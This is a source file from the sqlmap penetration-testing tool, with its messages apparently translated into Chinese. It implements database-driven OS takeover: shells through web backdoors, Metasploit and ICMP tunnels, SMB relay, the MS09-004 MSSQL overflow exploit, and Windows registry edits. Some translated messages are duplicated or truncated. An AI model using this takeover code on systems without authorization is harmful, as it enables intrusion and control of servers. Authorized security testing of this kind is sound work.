#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import getSafeExString
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import openFile
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapSystemException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = ("%soutput" % conf.tablePrefix)
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "將使用 Web 後門執行命令"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "無法通過後端 DBMS 執行操作系統命令"
            #errMsg += "the back-end DBMS"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "將使用 Web 後門打開命令提示符"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "無法通過後端 DBMS 提示交互式操作系統 shell,因為不支持堆疊查詢 SQL 注入"
            #errMsg += "system shell via the back-end DBMS because "
            #errMsg += "stacked queries SQL injection is not supported"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()

        try:
            self.initEnv(web=web)
        except SqlmapFilePathException:
            if not web and not conf.direct:
                infoMsg = "回退到 Web 後門方法..."
                logger.info(infoMsg)

                web = True
                kb.udfFail = True

                self.initEnv(web=web)
            else:
                raise

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = "您希望如何建立隧道？"
            msg += "\n[1] TCP: Metasploit 框架 (默認)"
            msg += "\n[2] ICMP: icmpsh - ICMP 隧道"

            while True:
                tunnel = readInput(msg, default='1')

                if isDigit(tunnel) and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = "無效的值,有效值為'1'和'2'"
                    logger.warning(warnMsg)
        else:
            tunnel = 1

            debugMsg = "當後端 DBMS 不是 Windows 時,只能通過 TCP 建立隧道"
            #debugMsg += "the back-end DBMS is not Windows"
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = "如果要建立基於 ICMP 的外帶信道,您需要以管理員身份運行 sqlmap,因為 icmpsh 使用原始套接字來嗅探和構造 ICMP 數據包"
                #errMsg += "if you want to establish an out-of-band ICMP "
                #errMsg += "tunnel because icmpsh uses raw sockets to "
                #errMsg += "sniff and craft ICMP packets"
                raise SqlmapMissingPrivileges(errMsg)

            try:
                __import__("impacket")
            except ImportError:
                errMsg = "sqlmap 需要'python-impacket'第三方庫才能運行 icmpsh 主程序。您可以在 https://github.com/SecureAuthCorp/impacket 獲取它"
                #errMsg += "in order to run icmpsh master. You can get it at "
                #errMsg += "https://github.com/SecureAuthCorp/impacket"
                raise SqlmapMissingDependence(errMsg)

            filename = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(filename):
                try:
                    with openFile(filename, "wb") as f:
                        f.write("1")
                except IOError as ex:
                    errMsg = "打開/寫入文件時發生錯誤,文件名為'%s'('%s')" % (filename, getSafeExString(ex))
                    #errMsg += "for filename '%s' ('%s')" % (filename, getSafeExString(ex))
                    raise SqlmapSystemException(errMsg)
            else:
                errMsg = "您需要在系統範圍內禁用 ICMP 回覆。例如,在 Linux/Unix 上運行:\n"
                errMsg += "如果您忘記這樣做,您將接收來自數據庫服務器的信息,但不太可能接收到您發送的命令"
                errMsg += "如果您忘記這樣做,您將接收來自數據庫服務器的信息,但不太可能接收到您發送的命令"
                #errMsg += "If you miss doing that, you will receive "
                #errMsg += "information from the database server and it "
                #errMsg += "is unlikely to receive commands sent from you"
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = "您希望如何在後端數據庫底層操作系統上執行 Metasploit shellcode？"
                    msg += "\n[1] 通過 UDF 'sys_bineval'(內存方式,反取證, 默認)"
                    msg += "\n[2] 通過'shellcodeexec'(文件系統方式,64 位系統上首選)"
                    #msg += "\n[2] Via 'shellcodeexec' (file system way, preferred on 64-bit systems)"

                    while True:
                        choice = readInput(msg, default='1')

                        if isDigit(choice) and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = "無效的值,有效值為'1'和'2'"
                            logger.warning(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = "無法掛載操作系統接管"
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = "默認情況下,Windows 上的 MySQL 運行為 SYSTEM 用戶,無需提權"
                    #debugMsg += "user, no need to privilege escalate"
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = "無法掛載操作系統接管"
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = "回退到 Web 後門以建立隧道"
            else:
                infoMsg = "將使用 Web 後門建立隧道"
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    # 如果後端 DBMS 底層操作系統不是 Windows,則取消設置--priv-esc
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg = "當後端 DBMS 底層系統不是 Windows 時,sqlmap 不實現任何操作系統用戶提權技術"
                    #warnMsg += "user privilege escalation technique when the "
                    #warnMsg += "back-end DBMS underlying system is not Windows"
                    logger.warning(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = "無法掛載操作系統接管"
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = "無法掛載操作系統接管"
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = "無法提示進行外帶會話"
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "後端 DBMS 底層操作系統不是 Windows"
            #errMsg += "not Windows: it is not possible to perform the SMB "
            #errMsg += "relay attack"
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = "在此後端 DBMS 上,只有在支持堆疊查詢的情況下才能執行 SMB 中繼攻擊"
                #errMsg += "perform the SMB relay attack if stacked "
                #errMsg += "queries are supported"
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "由於不支持堆疊查詢,sqlmap 將通過推斷式盲注執行 SMB 中繼攻擊"
                #debugMsg += "sqlmap is going to perform the SMB relay "
                #debugMsg += "attack via inference blind SQL injection"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = "此攻擊成功的可能性很小"

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += ",因為默認情況下,Windows 上的 MySQL 運行為 Local System,它不是真正的用戶,連接到 SMB 服務時不會發送 NTLM 會話哈希"
            #warnMsg += "Local System which is not a real user, it does "
            #warnMsg += "not send the NTLM session hash when connecting to "
            #warnMsg += "a SMB service"

        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += ",因為默認情況下,Windows 上的 PostgreSQL 運行為 postgres 用戶,它是系統的真正用戶,但不在 Administrators 組中"
            #warnMsg += "as postgres user which is a real user of the "
            #warnMsg += "system, but not within the Administrators group"

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += ",因為通常 Microsoft SQL Server %s " % Backend.getVersion()
            warnMsg += "運行為 Network Service,它不是真正的用戶,連接到 SMB 服務時不會發送 NTLM 會話哈希"
            #warnMsg += "it does not send the NTLM session hash when "
            #warnMsg += "connecting to a SMB service"

        else:
            printWarn = False

        if printWarn:
            logger.warning(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = "後端 DBMS 必須是 Microsoft SQL Server 2000 或 2005 才能利用'sp_replwritetovarbin'存儲過程 (MS09-004) 中的基於堆的緩衝區溢出漏洞"
            #errMsg += "2000 or 2005 to be able to exploit the heap-based "
            #errMsg += "buffer overflow in the 'sp_replwritetovarbin' "
            #errMsg += "stored procedure (MS09-004)"
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = "將利用 Microsoft SQL Server %s " % Backend.getVersion()
        #infoMsg += "'sp_replwritetovarbin' stored procedure heap-based "
        infoMsg += "'sp_replwritetovarbin'存儲過程的基於堆的緩衝區溢出漏洞 (MS09-004)"
        logger.info(infoMsg)

        msg = "此技術可能會導致 DBMS 進程停止響應,您確定要執行此漏洞利用嗎？[y/N] "
        #msg += "sure that you want to carry with the exploit? [y/N] "

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = "'uncPathRequest'方法必須在特定的 DBMS 插件中定義"
        #errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "後端 DBMS 底層操作系統不是 Windows"
            #errMsg += "not Windows"
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = "您要讀取哪個註冊表鍵？[%s] " % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = "您要讀取哪個註冊表鍵值？[%s] " % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "正在讀取 Windows 註冊表路徑'%s\\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = "缺少必填選項"

        if not conf.regKey:
            msg = "您要寫入哪個註冊表鍵？"
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "您要寫入哪個註冊表鍵值？"
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = "該註冊表鍵值的數據類型是什麼？"
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = "該註冊表鍵值的數據類型是什麼？"
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = "正在添加 Windows 註冊表路徑'%s\\%s' " % (regKey, regVal)
        infoMsg += "數據為'%s'。 " % regData
        #infoMsg += "This will work only if the user running the database "
        infoMsg += "只有運行數據庫進程的用戶具有修改 Windows 註冊表的權限時,此操作才能成功。"
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = "缺少必填選項"

        if not conf.regKey:
            msg = "您要刪除哪個註冊表鍵？"
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "您要刪除哪個註冊表鍵值？"
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = "您確定要刪除 Windows 註冊表路徑'%s\\%s'嗎？[y/N] " % (regKey, regVal)
        #message += "registry path '%s\\%s? [y/N] " % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = "正在刪除 Windows 註冊表路徑'%s\\%s'。 " % (regKey, regVal)
        #infoMsg += "This will work only if the user running the database "
        infoMsg += "只有運行數據庫進程的用戶具有修改 Windows 註冊表的權限時,此操作才能成功。"
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
